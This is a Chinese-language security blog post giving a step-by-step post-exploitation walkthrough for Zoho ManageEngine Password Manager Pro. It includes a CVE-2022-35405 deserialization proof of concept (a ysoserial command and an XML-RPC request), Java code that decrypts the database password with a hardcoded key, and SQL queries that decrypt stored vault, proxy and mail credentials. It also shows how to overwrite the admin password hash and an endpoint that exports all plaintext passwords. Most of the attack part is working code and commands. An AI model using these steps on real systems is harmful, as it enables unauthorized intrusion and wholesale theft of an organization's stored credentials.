---
title: "Zoho Password Manager Pro后利用技巧"
date: 2022-10-28T12:00:00+08:00
draft: false
author: "r0fus0d"
categories: ["技术"]

---

学习pmp这块相关知识点，做个简单的总结

{{% admonition info "info" %}}
本文首发 跳跳糖社区 https://tttang.com/archive/1791/
{{% /admonition %}}

<!--more-->

---

## 指纹

```bash
server=="PMP"

默认开启在7272端口
```

![Untitled](../../img/zoho-case/Untitled.png)

---

## 安装

- [https://www.manageengine.com/products/passwordmanagerpro/help/installation.html](https://www.manageengine.com/products/passwordmanagerpro/help/installation.html)

### windows

下载安装包，双击一路下一步即可

```bash
https://archives2.manageengine.com/passwordmanagerpro/12100/ManageEngine_PMP_64bit.exe
```

访问127.0.0.1:7272

![Untitled](../../img/zoho-case/Untitled%201.png)

### linux

下载安装包

```bash
https://archives2.manageengine.com/passwordmanagerpro/10501/ManageEngine_PMP_64bit.bin

chmod a+x ManageEngine_PMP_64bit.bin
./ManageEngine_PMP_64bit.bin -i console
cd /root/ManageEngine/PMP/bin
bash pmp.sh install
```

等待安装完毕，访问127.0.0.1:7272即可

---

## 远程调试

这里以windows为例

用process hacker查看服务启动后相关的进程和运行参数

![Untitled](../../img/zoho-case/Untitled%202.png)

java进程的启动参数：

```
"..\jre\bin\java" -Dcatalina.home=.. -Dserver.home=.. -Dserver.stats=1000 -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djava.util.logging.config.file=../conf/logging.properties -Djava.util.logging.config.class=com.adventnet.logging.LoggingScanner -Dlog.dir=.. -Ddb.home=../pgsql -Ddatabaseparams.file=./../conf/database_params.conf -Dstart.webclient=false -Dgen.db.password=true -Dsplashscreen.progress.color=7515939 -Dsplashscreen.fontforeground.color=7515939 -Dsplashscreen.fontbackground.color=-1 -Dsplash.filename=../images/passtrix_splash.png -Dsplashscreen.font.color=black -Djava.io.tmpdir=../logs -DcontextDIR=PassTrix -Dcli.debug=false -DADUserNameSyntax=domain.backslash.username -Duser.home=../logs/ -Dnet.phonefactor.pfsdk.debug=false -server -Dfile.encoding=UTF8 -Xms50m -Xmx512m -Djava.library.path="../lib/native" -classpath "../lib/wrapper.jar;../lib/tomcat/tomcat-juli.jar;run.jar;../tools.jar;../lib/AdventNetNPrevalent.jar;../lib/;../lib/AdventNetUpdateManagerInstaller.jar;../lib/conf.jar" -Dwrapper.key="n37Dhzdw8A8BWgGmjTi3w37jMJIKvUuZ" -Dwrapper.port=32000 -Dwrapper.jvm.port.min=31000 -Dwrapper.jvm.port.max=31999 -Dwrapper.pid=1000 -Dwrapper.version="3.5.25-pro" -Dwrapper.native_library="wrapper" -Dwrapper.arch="x86" -Dwrapper.service="TRUE" -Dwrapper.cpu.timeout="10" -Dwrapper.jvmid=1 -Dwrapper.lang.domain=wrapper -Dwrapper.lang.folder=../lang org.tanukisoftware.wrapper.WrapperSimpleApp com.adventnet.mfw.Starter
```

java进程的父进程为wrapper.exe，启动参数：

```
"C:\Program Files\ManageEngine\PMP\bin\wrapper.exe" -s "C:\Program Files\ManageEngine\PMP\conf\wrapper.conf"
```

查看文件`C:\Program Files\ManageEngine\PAM\conf\wrapper.conf`

其中存在几行被注释的调试选项

```
#uncomment the following to enable JPDA debugging
#wrapper.java.additional.27=-Xdebug
#wrapper.java.additional.28=-Xnoagent
#wrapper.java.additional.29=-Xrunjdwp:transport=dt_socket,address=8787,server=y,suspend=n
```

取消注释

```
wrapper.java.additional.27=-Xdebug
wrapper.java.additional.28=-Xnoagent
wrapper.java.additional.29=-Xrunjdwp:transport=dt_socket,address=8787,server=y,suspend=n
```

重启服务，再次查看java进程的参数：

![Untitled](../../img/zoho-case/Untitled%203.png)

IDEA设置如下

![Untitled](../../img/zoho-case/Untitled%204.png)

---

## 判断版本

在访问站点时，其默认加载的js、css路径中就包含了版本信息，如下图，`12121`代表其版本号

![Untitled](../../img/zoho-case/Untitled%205.png)

在官方站点可以下载相应版本号的安装包

- [https://archives2.manageengine.com/passwordmanagerpro/](https://archives2.manageengine.com/passwordmanagerpro/)

---

## CVE-2022-35405

这个洞影响范围 12100 及以下版本，在 12101 被修复

![Untitled](../../img/zoho-case/Untitled%206.png)

poc

使用`ysoserial`的`CommonsBeanutils1`来生成Payload：

```bash
java -jar ysoserial.jar CommonsBeanutils1 "ping uqgr9k.dnslog.cn" | base64 | tr -d "\n"
```

替换到下面的`[base64-payload]`部分

```bash
POST /xmlrpc HTTP/1.1
Host: your-ip
Content-Type: application/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>ProjectDiscovery</methodName>
  <params>
    <param>
      <value>
        <struct>
          <member>
            <name>test</name>
            <value>
              <serializable xmlns="http://ws.apache.org/xmlrpc/namespaces/extensions">[base64-payload]</serializable>
            </value>
          </member>
        </struct>
      </value>
    </param>
  </params>
</methodCall>
```

![Untitled](../../img/zoho-case/Untitled%207.png)

![Untitled](../../img/zoho-case/Untitled%208.png)

![Untitled](../../img/zoho-case/Untitled.webp)

---

## 密钥文件

### windows

以windows平台的pmp为例

`database_params.conf`文件中存储了数据库的用户名和加密数据库密码。

![Untitled](../../img/zoho-case/Untitled%209.png)

```bash
# $Id$
# driver name
drivername=org.postgresql.Driver

# login username for database if any
username=pmpuser

# password for the db can be specified here
password=NYubvnnJJ6ii871X/dYr5xwkr1P6yGCEeoA=
# url is of the form jdbc:subprotocol:DataSourceName for eg.jdbc:odbc:WebNmsDB
url=jdbc:postgresql://localhost:2345/PassTrix?ssl=require

# Minumum Connection pool size
minsize=1

# Maximum Connection pool size
maxsize=20

# transaction Isolation level
#values are Constanst defined in java.sql.connection type supported TRANSACTION_NONE 	0
#Allowed values are TRANSACTION_READ_COMMITTED , TRANSACTION_READ_UNCOMMITTED ,TRANSACTION_REPEATABLE_READ , TRANSACTION_SERIALIZABLE
transaction_isolation=TRANSACTION_READ_COMMITTED
exceptionsorterclassname=com.adventnet.db.adapter.postgres.PostgresExceptionSorter

# check is the database password encrypted or not
db.password.encrypted=true
```

可以看到默认 pgsql 用户为`pmpuser`,而加密的数据库密码为`NYubvnnJJ6ii871X/dYr5xwkr1P6yGCEeoA=`

`pmp_key.key`文件显示 PMP 密钥,这个用于加密数据库中的密码

![Untitled](../../img/zoho-case/Untitled%2010.png)

```bash
#本文件是由PMP自动生成的，它包含了本次安装所使用的AES加密主密钥。
#该文件默认存储在<PMP_HOME>/conf目录中。除非您的服务器足够安全，不允许其他任何非法访问，
#否则，该文件就有可能泄密，属于安全隐患。因此，强烈建议您将该文件从默认位置移动到
#PMP安装服务器以外的其它位置（如：文件服务器、U盘等），并按照安全存储要求保存该文件。
#Fri Oct 21 16:08:30 CST 2022
ENCRYPTIONKEY=G8N1EX+nkQlPVpd29eenVOYWCCS0oF/EPZdswlorot8\=
```

### Linux

`database_params.conf`文件存放在`/root/ManageEngine/PMP/conf/database_params.conf`

`pmp_key.key`文件存放在`/root/ManageEngine/PMP/conf/pmp_key.key`

---

## 恢复pgsql的密码

要连接pgsql，首先需要解密pmp加密的pgsql数据库密码

找下pmp对数据库密码的加密逻辑，在shielder的文章 [https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/](https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/) 给出了加密类

![Untitled](../../img/zoho-case/Untitled%2011.png)

找到对应jar文件

![Untitled](../../img/zoho-case/Untitled%2012.png)

反编译查看解密的逻辑

![Untitled](../../img/zoho-case/Untitled%2013.png)

![Untitled](../../img/zoho-case/Untitled%2014.png)

可以发现encodedKey是取`@dv3n7n3tP@55Tri*`的5到10位

通过使用其DecryptDBPassword函数可以解密数据库密码，不过在shielder的文章中给出了解密的代码,直接解密

```java
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.Base64;
import java.lang.StringBuilder;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

class PimpMyPMP {
    public synchronized String decrypt(byte[] cipherText, String password) throws Exception {
        Cipher cipher;
        byte[] aeskey;

        for (int i = password.length(); i < 32; ++i) {
            password = password + " ";
        }
        if (password.length() > 32) {
            try {
                aeskey = Base64.getDecoder().decode(password);
            } catch (IllegalArgumentException e) {
                aeskey = password.getBytes();
            }
        }
        aeskey = password.getBytes();
        try {
            byte[] ivArr = new byte[16];
            for (int i = 0; i < 16; ++i) {
                ivArr[i] = cipherText[i];
            }
            cipher = Cipher.getInstance("AES/CTR/NoPadding");
            SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
            PBEKeySpec spec = new PBEKeySpec(new String(aeskey, "UTF-8").toCharArray(), new byte[]{1, 2, 3, 4, 5, 6, 7, 8}, 1024, 256);
            SecretKey temp = factory.generateSecret(spec);
            SecretKeySpec secret = new SecretKeySpec(temp.getEncoded(), "AES");
            cipher.init(2, (Key) secret, new IvParameterSpec(ivArr));

            byte[] cipherTextFinal = new byte[cipherText.length - 16];
            int j = 0;
            for (int i = 16; i < cipherText.length; ++i) {
                cipherTextFinal[j] = cipherText[i];
                ++j;
            }

            return new String(cipher.doFinal(cipherTextFinal), "UTF-8");
        } catch (IllegalBlockSizeException | BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException |
                 InvalidKeyException | InvalidAlgorithmParameterException | InvalidKeySpecException ex) {
            ex.printStackTrace();
            throw new Exception("Exception occurred while encrypting", ex);
        }
    }

    private static String hardcodedDBKey() throws NoSuchAlgorithmException {
        String key = "@dv3n7n3tP@55Tri*".substring(5, 10);
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(key.getBytes());
        byte[] bkey = md.digest();
        StringBuilder sb = new StringBuilder(bkey.length * 2);
        for (byte b : bkey) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }

    public String decryptDBPassword(String encPassword) throws Exception {
        String decryptedPassword = null;
        if (encPassword != null) {
            try {
                decryptedPassword = this.decryptPassword(encPassword, PimpMyPMP.hardcodedDBKey());
            } catch (Exception e) {
                throw new Exception("Exception ocuured while decrypt the password");
            }
            return decryptedPassword;
        }
        throw new Exception("Password should not be Null");
    }

    public String decryptPassword(String encryptedPassword, String key) throws Exception {
        String decryptedPassword = null;
        if (encryptedPassword == null || "".equals(encryptedPassword)) {
            return encryptedPassword;
        }
        try {
            byte[] encPwdArr = Base64.getDecoder().decode(encryptedPassword);
            decryptedPassword = this.decrypt(encPwdArr, key);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return decryptedPassword;
    }

    public static void main(String[] args) {
        PimpMyPMP klass = new PimpMyPMP();
        try {
            // database_params.conf
            String database_password = "";
            System.out.print("Database Key: ");
            System.out.println(klass.decryptDBPassword(database_password));

            // pmp_key.key
            String pmp_password = "";

            // select notesdescription from Ptrx_NotesInfo
            String notesdescription = "";
            System.out.print("MASTER Key: ");
            System.out.println(klass.decryptPassword(notesdescription, pmp_password));

            // decryptschar(column, master_key)
            String passwd = "";
            System.out.print("Passwd: ");
            System.out.println(klass.decryptPassword(passwd, pmp_password));

        } catch (Exception e) {
            System.out.println("Fail!");
        }
    }
}
```

填入加密的数据库密码，查看结果

![Untitled](../../img/zoho-case/Untitled%2015.png)

可以看到密码为:sC1ekMrant

连接pgsql测试

![Untitled](../../img/zoho-case/Untitled%2016.png)

![Untitled](../../img/zoho-case/Untitled%2017.png)

这里注意,pmp默认的pgsql是只监听127的2345，无法外部连接，如果是rce打的，可以自行进行端口转发

![Untitled](../../img/zoho-case/Untitled%2018.png)

---

## 获取`master key`

在连接数据库后，查询加密的`master key`

```java
select notesdescription from Ptrx_NotesInfo
```

![Untitled](../../img/zoho-case/Untitled%2019.png)

这里通过`pmp_key.key`文件中的PMP 密钥来解密`master key`

shielder的代码在解的时候有些问题，这里使用[https://github.com/trustedsec/Zoinks](https://github.com/trustedsec/Zoinks)项目来进行解密

![Untitled](../../img/zoho-case/Untitled%2020.png)

得到`master key`

---

## 解密数据库中的密码

首先先查询数据库中的存储的密码

```sql
select ptrx_account.RESOURCEID, ptrx_resource.RESOURCENAME, ptrx_resource.RESOURCEURL, ptrx_password.DESCRIPTION, ptrx_account.LOGINNAME, decryptschar(ptrx_passbasedauthen.PASSWORD,'***master_key***') from ptrx_passbasedauthen LEFT JOIN ptrx_password ON ptrx_passbasedauthen.PASSWDID = ptrx_password.PASSWDID LEFT JOIN ptrx_account ON ptrx_passbasedauthen.PASSWDID = ptrx_account.PASSWDID LEFT JOIN ptrx_resource ON ptrx_account.RESOURCEID = ptrx_resource.RESOURCEID
```

用`master key`替换语句里的`***master_key***`部分

![Untitled](../../img/zoho-case/Untitled%2021.png)

继续使用Zoinks进行解密

![Untitled](../../img/zoho-case/Untitled%2022.png)

这里解密出test资源,root用户的明文口令123456

---

## 解密代理配置

当配置了代理服务器时,同样用类似的方法进行查询和解密

![Untitled](../../img/zoho-case/Untitled%2023.png)

```sql
select proxy_id,direct_connection,proxy_server,proxy_port,username,decryptschar(ptrx_proxysettings.PASSWORD,'***master_key***') from ptrx_proxysettings
```

![Untitled](../../img/zoho-case/Untitled%2024.png)

![Untitled](../../img/zoho-case/Untitled%2025.png)

---

## 解密邮件服务器配置

pmp这个默认都是配置了邮件服务器的

```sql
select mailid,mailserver,mailport,sendermail,username,decryptschar(ptrx_mailsettings.PASSWORD,'***master_key***'),tls,ssl,tlsifavail,never from ptrx_mailsettings
```

![Untitled](../../img/zoho-case/Untitled%2026.png)

---

## pg数据库postgres用户密码

```sql
select username,decryptschar(dbcredentialsaudit.PASSWORD,'***master_key***'),last_modified_time from dbcredentialsaudit
```

![Untitled](../../img/zoho-case/Untitled%2027.png)

![Untitled](../../img/zoho-case/Untitled%2028.png)

---

## 进入 pmp web后台

在数据库中查询web后台的账号密码

```sql
select * from aaauser;
```

![Untitled](../../img/zoho-case/Untitled%2029.png)

```sql
select * from aaapassword;
```

![Untitled](../../img/zoho-case/Untitled%2030.png)

这里密码是进行bcryptsha512加密的，可以用hashcat进行爆破

![Untitled](../../img/zoho-case/Untitled%2031.png)

也可通过覆盖hash的方式修改admin账号的密码，例如修改为下列数据，即可将admin密码改为test2

```
"password_id"	"password"	"algorithm"	"salt"	"passwdprofile_id"	"passwdrule_id"	"createdtime"	"factor"
"1"	"$2a$12$bOUtxZzgrAu.3ApJM7fUYu7xBfxhJ4k2gx5CQE5BzMcN.cr/6cbhy"	"bcrypt"	"wwwECQECvU8zqfmCnXfSTgFnfz9CDl/cX+yDwJEhJ+91ADnOHbR0q7rOASpBqm2mQgYLHtlUJSX5u4ad7yOJpVNkoPJoI6gev75VAwAf/BTM4rpHTLT+cCdWMwnHmg=="	"1"	"3"	"1666345834309"	"12"
```

注意⚠️：覆盖前务必备份源hash数据

![Untitled](../../img/zoho-case/Untitled%2032.png)

进入后台后可直接导出所有明文密码

```
/jsp/xmlhttp/AjaxResponse.jsp?RequestType=ExportPasswords
```

![Untitled](../../img/zoho-case/Untitled%2033.png)

---

## 本地 Web-Accounts reports 文件

在后台personal页面导出个人报告时可以选择pdf或xls格式，该文件在导出后会一直存在在服务器上

![Untitled](../../img/zoho-case/Untitled%2034.png)

这个问题在12122被修复

![Untitled](../../img/zoho-case/Untitled%2035.png)

---

## ppm 文件的安装方法

ppm是pmp的更新包，在windows上通过UpdateManager.bat进行安装，在linux上通过UpdateManager.sh进行安装

- [https://www.manageengine.com/products/passwordmanagerpro/help/faq.html](https://www.manageengine.com/products/passwordmanagerpro/help/faq.html)

---

## Source & Reference

- [https://www.trustedsec.com/blog/the-curious-case-of-the-password-database/](https://www.trustedsec.com/blog/the-curious-case-of-the-password-database/)
- [https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/](https://www.shielder.com/blog/2022/09/how-to-decrypt-manage-engine-pmp-passwords-for-fun-and-domain-admin-a-red-teaming-tale/)
- [https://y4er.com/posts/cve-2022-35405-zoho-password-manager-pro-xml-rpc-rce](https://y4er.com/posts/cve-2022-35405-zoho-password-manager-pro-xml-rpc-rce)
- [https://github.com/trustedsec/Zoinks](https://github.com/trustedsec/Zoinks)
- [https://www.manageengine.com/products/passwordmanagerpro/help/installation.html#inst-lin](https://www.manageengine.com/products/passwordmanagerpro/help/installation.html#inst-lin)
- [https://github.com/3gstudent/3gstudent.github.io/blob/main/_posts/---2022-8-12-Password Manager Pro漏洞调试环境搭建.md](https://github.com/3gstudent/3gstudent.github.io/blob/main/_posts/---2022-8-12-Password%20Manager%20Pro%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md)
- [https://github.com/3gstudent/3gstudent.github.io/blob/main/_posts/---2022-8-17-Password Manager Pro利用分析——数据解密.md](https://github.com/3gstudent/3gstudent.github.io/blob/main/_posts/---2022-8-17-Password%20Manager%20Pro%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E8%A7%A3%E5%AF%86.md)
